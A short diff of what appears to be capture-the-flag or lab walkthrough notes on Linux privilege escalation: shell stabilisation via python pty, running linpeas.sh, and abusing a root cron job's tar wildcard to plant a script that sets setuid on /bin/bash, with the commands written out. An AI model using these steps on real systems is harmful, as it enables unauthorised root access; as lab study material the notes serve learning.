@@ -56,6 +56,7 @@ stablize shell by using python to spawn bash shell
 pyhton -c "import pty;pty.spawn('/bin/bash')"
 
 get linpeas.sh on to target
+chmod +x linpeas.sh
 execute linpeas.sh to show cron job being run every minute as root to tar var/www/html 
 take advantage of tar wilcard priv esc and make root execute a script that allows /bin/bash to be run as setuid
 $printf "#!/bin/bash\nchmod +s /bin/bash" > shell.sh                                                                     
